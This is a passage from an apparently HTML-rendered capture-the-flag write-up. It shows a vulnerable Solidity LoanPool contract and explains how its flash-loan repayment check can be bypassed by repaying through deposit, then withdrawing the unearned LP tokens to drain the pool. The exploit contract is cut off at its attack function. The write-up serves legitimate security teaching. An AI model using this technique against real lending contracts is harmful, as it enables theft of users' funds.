</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">FixedMathLib</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./FixedPointMath.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Errors.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20Minimal</span><span class="p">,</span> <span class="n">IERC3156FlashBorrower</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Interfaces.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Events</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Events.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">struct</span> <span class="nc">UserRecord</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">feePerShare</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="n">feesAccumulated</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">LoanPool</span> <span class="k">is</span> <span class="n">Events</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kn">using</span> <span class="n">FixedMathLib</span> <span class="k">for</span> <span class="kt">uint256</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">constant</span> <span class="n">BONE</span> <span class="o">=</span> <span class="mi">10</span> <span class="o">**</span> <span class="mi">18</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">underlying</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">totalSupply</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">public</span> <span class="n">feePerShare</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="n">UserRecord</span><span class="p">)</span> <span class="k">public</span> <span class="n">userRecords</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_underlying</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">underlying</span> <span class="o">=</span> <span class="n">_underlying</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">deposit</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">updateFees</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">IERC20Minimal</span><span class="p">(</span><span class="n">underlying</span><span class="p">).</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_mint</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">userRecords</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">].</span><span class="nb">balance</span> <span class="o">&lt;</span> <span class="n">amount</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">InsufficientBalance</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">updateFees</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">_burn</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">IERC20Minimal</span><span class="p">(</span><span class="n">underlying</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">updateFees</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">_msgsender</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">UserRecord</span> <span class="k">storage</span> <span class="n">record</span> <span class="o">=</span> <span class="n">userRecords</span><span class="p">[</span><span class="n">_msgsender</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fees</span> <span class="o">=</span> <span class="n">record</span><span class="p">.</span><span class="nb">balance</span><span class="p">.</span><span class="n">fixedMulCeil</span><span class="p">((</span><span class="n">feePerShare</span> <span class="o">-</span> <span class="n">record</span><span class="p">.</span><span class="n">feePerShare</span><span class="p">),</span> <span class="n">BONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">record</span><span class="p">.</span><span class="n">feesAccumulated</span> <span class="o">+=</span> <span class="n">fees</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">record</span><span class="p">.</span><span class="n">feePerShare</span> <span class="o">=</span> <span class="n">feePerShare</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">FeesUpdated</span><span class="p">(</span><span class="n">underlying</span><span class="p">,</span> <span class="n">_msgsender</span><span class="p">,</span> <span class="n">fees</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdrawFees</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">_msgsender</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fees</span> <span class="o">=</span> <span class="n">userRecords</span><span class="p">[</span><span class="n">_msgsender</span><span class="p">].</span><span class="n">feesAccumulated</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">fees</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">NoFees</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">userRecords</span><span class="p">[</span><span class="n">_msgsender</span><span class="p">].</span><span class="n">feesAccumulated</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">IERC20Minimal</span><span class="p">(</span><span class="n">underlying</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span><span class="n">_msgsender</span><span class="p">,</span> <span class="n">fees</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">FeesUpdated</span><span class="p">(</span><span class="n">underlying</span><span class="p">,</span> <span class="n">_msgsender</span><span class="p">,</span> <span class="n">fees</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">fees</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">userRecords</span><span class="p">[</span><span class="n">account</span><span class="p">].</span><span class="nb">balance</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Flash loan EIP
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">maxFlashLoan</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">token</span> <span class="o">!=</span> <span class="n">underlying</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">NotSupported</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">IERC20Minimal</span><span class="p">(</span><span class="n">token</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashFee</span><span class="p">(</span><span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">token</span> <span class="o">!=</span> <span class="n">underlying</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">NotSupported</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">_computeFee</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span><span class="n">IERC3156FlashBorrower</span> <span class="n">receiver</span><span class="p">,</span> <span class="kt">address</span> <span class="n">token</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span> <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">external</span>
</span></span><span class="line"><span class="cl">        <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">token</span> <span class="o">!=</span> <span class="n">underlying</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">NotSupported</span><span class="p">(</span><span class="n">token</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">IERC20Minimal</span> <span class="n">_token</span> <span class="o">=</span> <span class="n">IERC20Minimal</span><span class="p">(</span><span class="n">underlying</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">_balanceBefore</span> <span class="o">=</span> <span class="n">_token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">&gt;</span> <span class="n">_balanceBefore</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">InsufficientBalance</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">_fee</span> <span class="o">=</span> <span class="n">_computeFee</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_token</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">receiver</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">receiver</span><span class="p">.</span><span class="n">onFlashLoan</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">underlying</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">_fee</span><span class="p">,</span> <span class="nb">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="o">!=</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;ERC3156FlashBorrower.onFlashLoan&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">CallbackFailed</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">_balanceAfter</span> <span class="o">=</span> <span class="n">_token</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">_balanceAfter</span> <span class="o">&lt;</span> <span class="n">_balanceBefore</span> <span class="o">+</span> <span class="n">_fee</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">revert</span> <span class="n">LoanNotRepaid</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// The fee is `fee`, but the user may have sent more.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">interest</span> <span class="o">=</span> <span class="n">_balanceAfter</span> <span class="o">-</span> <span class="n">_balanceBefore</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">_updateFeePerShare</span><span class="p">(</span><span class="n">interest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">FlashLoanSuccessful</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">receiver</span><span class="p">),</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">token</span><span class="p">,</span> <span class="n">amount</span><span class="p">,</span> <span class="n">_fee</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// Private methods
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">_mint</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">totalSupply</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">userRecords</span><span class="p">[</span><span class="n">to</span><span class="p">].</span><span class="nb">balance</span> <span class="o">+=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">to</span><span class="p">,</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_burn</span><span class="p">(</span><span class="kt">address</span> <span class="k">from</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">totalSupply</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">userRecords</span><span class="p">[</span><span class="k">from</span><span class="p">].</span><span class="nb">balance</span> <span class="o">-=</span> <span class="n">amount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="k">from</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">amount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_updateFeePerShare</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">interest</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">feePerShare</span> <span class="o">+=</span> <span class="n">interest</span><span class="p">.</span><span class="n">fixedDivFloor</span><span class="p">(</span><span class="n">totalSupply</span><span class="p">,</span> <span class="n">BONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">_computeFee</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">private</span> <span class="k">pure</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// 0.05% fee
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="n">amount</span><span class="p">.</span><span class="n">fixedMulCeil</span><span class="p">(</span><span class="mi">5</span> <span class="o">*</span> <span class="n">BONE</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000</span><span class="p">,</span> <span class="n">BONE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Although the contract is extensive, I&rsquo;ll focus on the crucial and flawed functions.</p>
<p>Firstly, the <code>deposit</code> function allows users to deposit <code>TOKEN</code> into the <code>LoanPool</code>, which in return mints an equivalent amount of <code>LPToken</code>.</p>
<p>Next, the <code>withdraw</code> function permits users to burn a specified amount of their <code>LPToken</code> to reclaim an equal amount of <code>TOKEN</code>.</p>
<p>Lastly, the <code>flashLoan</code> function enables users to borrow funds within a single transaction, where the borrowed amount, plus a <code>loanFee</code>, must be returned before the transaction completes. Now that we know the main features, let&rsquo;s try to think how to exploit this.</p>
<h3 id="solution">Solution</h3>
<p>The critical oversight lies within the <code>flashLoan</code> function. Let&rsquo;s break down its operation:</p>
<ul>
<li>It checks the initial balance (<code>_balanceBefore</code>).</li>
<li>Calculates the loan fee.</li>
<li>Transfers <code>amount</code> of <code>TOKEN</code> to the <code>receiver</code>.</li>
<li>Executes <code>receiver.onFlashLoan</code>.
<ul>
<li>The <code>receiver</code> must be a contract with an <code>onFlashLoan</code> function returning <code>keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;)</code>.</li>
</ul>
</li>
<li>Checks the balance post-<code>onFlashLoan</code>.</li>
<li>Reverts if the new balance is less than <code>_balanceBefore + _fee</code>.</li>
</ul>
<p>The flaw is in validating the return of borrowed funds, as it only verifies the <code>pool</code>&rsquo;s balance reaches <code>_balanceBefore + _fee</code>. It fails to account for the method of returning the funds. The contract assumes funds are returned via a direct transfer, overlooking the possibility of using the <code>deposit</code> function.</p>
<p>For instance, if a user executes <code>flashLoan(10 ether)</code>, receives the funds, and instead of transferring them back directly, they deposit the <code>10 ether</code> and separately transfer the <code>loanFee</code>. This process results in:</p>
<ul>
<li>The user acquiring <code>10 ether</code> of <code>LPToken</code>.</li>
<li>The pool&rsquo;s balance returning to <code>10 ether</code>.</li>
<li>The pool receiving the <code>loanFee</code> through a manual transfer.</li>
</ul>
<p>This method allows a user to mint <code>10 ether</code> of <code>LPToken</code> without spending <code>10 ether</code> of <code>TOKEN</code>, only the loan fee. Subsequently, the user can withdraw <code>10 ether</code>, causing the pool to burn the <code>LPToken</code> and return an equivalent amount of <code>TOKEN</code>. This action reduces the pool&rsquo;s <code>TOKEN</code> balance below <code>10 ether</code>, enabling flag retrieval.</p>
<p>Below is the exploit contract designed to exploit the identified vulnerability. The contract aims to initiate a <code>flashLoan</code> and ingeniously returns the loan via a <code>deposit</code> action, also taking care of transferring the necessary <code>fee</code> as dictated by the <code>pool</code> during its invocation of our exploit contract&rsquo;s <code>onFlashLoan</code> method. Subsequently, the exploit allows for the withdrawal of the erroneously granted LP Token, capitalizing on the bug. Comments within the code offer further clarification on its workings.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">FixedMathLib</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./FixedPointMath.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;./Errors.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">IERC20Minimal</span><span class="p">,</span> <span class="n">IERC3156FlashBorrower</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Interfaces.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Events</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Events.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">LoanPool</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./LoanPool.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Token</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Token.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Setup</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;./Setup.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exploit</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">LoanPool</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TARGET</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">Token</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">TOKEN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_setup</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Setup</span> <span class="n">setup</span> <span class="o">=</span> <span class="n">Setup</span><span class="p">(</span><span class="n">_setup</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">TARGET</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">TARGET</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">TOKEN</span> <span class="o">=</span> <span class="n">setup</span><span class="p">.</span><span class="n">TOKEN</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
